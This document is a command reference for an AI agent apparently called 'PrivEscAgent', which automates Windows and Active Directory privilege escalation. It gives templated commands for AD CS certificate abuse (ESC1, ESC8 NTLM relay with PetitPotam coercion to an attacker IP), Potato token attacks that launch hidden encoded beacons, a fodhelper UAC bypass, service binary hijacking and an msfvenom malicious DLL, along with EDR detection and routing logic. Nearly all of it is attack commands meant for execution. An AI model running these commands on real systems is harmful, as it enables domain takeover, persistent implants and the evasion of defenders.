# Privilege Escalation — Tool commands reference

Templated commands the `PrivEscAgent` dispatches. Placeholders use the same
convention as `discovering-environment/reference/tool-commands.md`.

**Global substitution key**

| Placeholder       | Source                                     |
|-------------------|--------------------------------------------|
| `<ARTIFACTS>`     | per-stage artifact directory               |
| `<DOMAIN>`        | `domain.name`                              |
| `<DC_IP>`         | `network.dc_ip`                            |
| `<CA_HOST>`       | AD CS CA hostname from `ad.adcs_vulns`     |
| `<CA_NAME>`       | AD CS CA name from `ad.adcs_vulns`         |
| `<TEMPLATE>`      | vulnerable template name from `ad.adcs_vulns` |
| `<ATTACKER_IP>`   | attacker / C2 listener IP                  |
| `<LSASS_PID>`     | PID from `tasklist \| findstr lsass`       |

---

## P0 — Current privilege state check

Run as the very first ability on every machine. Two commands only — no tools, no disk writes.

### Check current user and groups

```
whoami /all
whoami /groups
```

### Parse integrity level

```
whoami /groups | findstr "Mandatory Label"
# Mandatory Label\System Mandatory Level  → already SYSTEM
# Mandatory Label\High Mandatory Level    → high integrity
# Mandatory Label\Medium Mandatory Level  → medium integrity (UAC applies)
# Mandatory Label\Low Mandatory Level     → low integrity (restricted)
```

### Parse group memberships

```
whoami /groups | findstr /i "domain admins\|enterprise admins\|administrators\|SYSTEM"
```

### Decision output — save ALL of these from P0

| Check | Command | Save key | Value |
|---|---|---|---|
| Running as SYSTEM? | `whoami` returns `nt authority\system` | `host.already_system` | true/false |
| Domain Admin / EA? | `whoami /groups` contains `Domain Admins` or `Enterprise Admins` | `host.is_domain_admin` | true/false |
| Local admin member? | `whoami /groups` contains `BUILTIN\Administrators` or `Administrators` | `host.is_local_admin` | true/false |
| Integrity level? | `whoami /groups \| findstr "Mandatory Label"` | `host.current_integrity_level` | system/high/medium/low |

### Short-circuit routing after P0

```
# After parsing the above — route immediately based on result:

IF host.already_system = true OR host.is_domain_admin = true:
    → set privesc.system_token = true (or privesc.local_admin = true)
    → set phase_done = true
    → recommended_next = "accessing-credentials"
    → DO NOT run P1 through P6

IF host.is_local_admin = true AND host.current_integrity_level = "high":
    → set phase_done = false
    → skip P1, P2, P3
    → go directly to P4 (UAC already bypassed — just need to verify)
    → then accessing-credentials

IF host.is_local_admin = true AND host.current_integrity_level = "medium":
    → continue to P1 (need to enumerate EDR etc)
    → then P4 (UAC bypass needed)

IF host.is_local_admin = false:
    → continue to P1 (full escalation path)
```

---

## P1 — Local host enumeration

Run on every machine before any exploitation attempt.

### Automated enumeration

```
Seatbelt.exe -group=all -outputfile=<ARTIFACTS>/privesc/seatbelt.txt
winpeas.exe > <ARTIFACTS>/privesc/winpeas.txt 2>&1
```

### Identity and privileges

```
whoami /all
whoami /priv
whoami /groups
```

Interpret token privileges:

| Privilege                  | Exploitation path                                      |
|----------------------------|--------------------------------------------------------|
| SeImpersonatePrivilege     | P3 Potato attacks → instant SYSTEM                     |
| SeBackupPrivilege          | Read NTDS.dit without DA (`accessing-credentials`)     |
| SeDebugPrivilege           | Attach to LSASS (`accessing-credentials`)              |
| SeTakeOwnershipPrivilege   | Take ownership of any protected object                 |
| SeLoadDriverPrivilege      | BYOVD kernel driver load (`evading-defenses`)          |

### OS and domain context

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"
hostname
```

### AV / EDR detection

```
sc query | findstr /i "defender\|crowdstrike\|carbon\|sentinel\|cylance\|cortex"
Get-MpComputerStatus
tasklist | findstr /i "MsSense\|CSFalcon\|cb\|SentinelAgent\|CylanceSvc"
```

### Local admins and open ports

```
net localgroup administrators
netstat -ano | findstr LISTENING
```

### PowerUp automated check (all service / path misconfigs in one shot)

```
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks | Out-File <ARTIFACTS>/privesc/powerup.txt"
```

---

## P2 — AD CS abuse (ESC1–ESC8)

Gate: only run when `ad.adcs_vulns` is non-empty from discovery D3.

### ESC1 — Windows (Certify + Rubeus)

```
# Step 1: request cert with administrator as SAN
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TEMPLATE> /altname:administrator

# Step 2: convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex \
    -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
    -export -out cert.pfx -passout pass:

# Step 3: get DA TGT from cert
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password: /ptt

# Verify
klist
```

### ESC1 — Linux (certipy full chain)

```
# Step 1: request cert
certipy req -u <USER>@<DOMAIN> -p '<PASS>' \
    -ca <CA_NAME> -template <TEMPLATE> \
    -upn administrator@<DOMAIN> \
    -dc-ip <DC_IP>

# Step 2: authenticate and get NTLM hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

### ESC8 — NTLM relay to AD CS web enrollment

```
# On attacker — start relay targeting CA HTTP endpoint
ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp \
    --adcs --template DomainController

# Trigger DC authentication (coerce via PetitPotam / PrinterBug)
PetitPotam.py <ATTACKER_IP> <DC_IP>

# Use issued DC cert to get TGT
rubeus.exe asktgt /user:DC01$ /certificate:<DC_CERT_B64> /ptt
```

---

## P3 — Token impersonation / Potato attacks

Gate: `SeImpersonatePrivilege` confirmed in P1.

### Check privilege

```
whoami /priv | findstr SeImpersonatePrivilege
```

### GodPotato (try first — widest OS support)

```
# Run command as SYSTEM
GodPotato.exe -cmd "cmd /c whoami > <ARTIFACTS>/privesc/p3_godpotato.txt"

# Drop and execute beacon
GodPotato.exe -cmd "powershell -w hidden -enc <BASE64_BEACON>"
```

### PrintSpoofer (Win10 / Server 2019+)

```
# Interactive SYSTEM shell
PrintSpoofer.exe -i -c cmd

# Execute beacon
PrintSpoofer.exe -c "powershell -w hidden -enc <BASE64_BEACON>"
```

### RoguePotato (requires attacker listener on :9999)

```
RoguePotato.exe -r <ATTACKER_IP> -e "cmd /c beacon.exe" -l 9999
```

### SweetPotato (fallback)

```
SweetPotato.exe -a "whoami"
SweetPotato.exe -e EfsRpc -p beacon.exe
```

### Verify SYSTEM

```
whoami
# Expected: nt authority\system
```

---

## P4 — UAC bypass

Gate: medium-integrity process AND user is in local Administrators group.

### Check integrity level

```
whoami /groups | findstr "Mandatory Label"
# Medium Mandatory Level → UAC bypass needed
# High Mandatory Level → proceed directly
```

### Check UAC configuration

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Method 1 — fodhelper (no binary drop, stealthiest)

```
# Create registry keys
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(default)" -Value "cmd.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" -Value "" -Force

# Trigger high-integrity process
Start-Process fodhelper.exe

# Verify
whoami /groups | findstr "High Mandatory Level"
```

### Method 2 — UACME (60+ methods; try 61 first, then 41)

```
# Method 61 (consent.exe COM activation)
Akagi64.exe 61 cmd.exe

# Method 41 (wusa.exe / Cabinet extraction)
Akagi64.exe 41 <ARTIFACTS>/privesc/beacon.exe
```

---

## P5 — Unquoted service path & weak permissions

### Detect unquoted service paths

```
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v '"'
```

```powershell
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch '"' -and $_.PathName -notmatch '^C:\\Windows'
} | Select-Object Name, PathName
```

### Check write permissions on path segments

```
icacls "C:\Program Files\Vulnerable App"
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
```

### Drop payload and restart service

```
copy <ARTIFACTS>/beacon.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnService
sc start VulnService
```

### Detect weak service binary permissions

```powershell
Get-WmiObject Win32_Service | ForEach-Object {
    icacls $_.PathName 2>$null
} | findstr "Everyone\|BUILTIN\Users\|Authenticated Users"
```

### Replace weak binary

```
copy <ARTIFACTS>/beacon.exe "C:\Path\To\VulnerableService.exe"
sc stop VulnerableService && sc start VulnerableService
```

---

## P6 — DLL hijacking & sideloading

### Automated detection (Robber)

```
Robber.exe /type:2 /quiet /output:<ARTIFACTS>/privesc/robber.txt
```

### Manual: check writable directories in PATH

```powershell
foreach ($p in $env:PATH.Split(';')) {
    icacls $p 2>$null | findstr "Everyone\|BUILTIN\Users\|Authenticated Users"
}
```

### Craft malicious DLL

```
msfvenom -p windows/x64/exec CMD="<ARTIFACTS>/beacon.exe" \
    -f dll -o <ARTIFACTS>/privesc/target.dll
```

### Drop DLL in writable path before legitimate location

```
copy <ARTIFACTS>/privesc/target.dll "C:\writable\path\missing.dll"
```

### Verify execution

After the target application or service loads:
- Confirm beacon callback from service account context
- `whoami` in callback shell confirms execution account
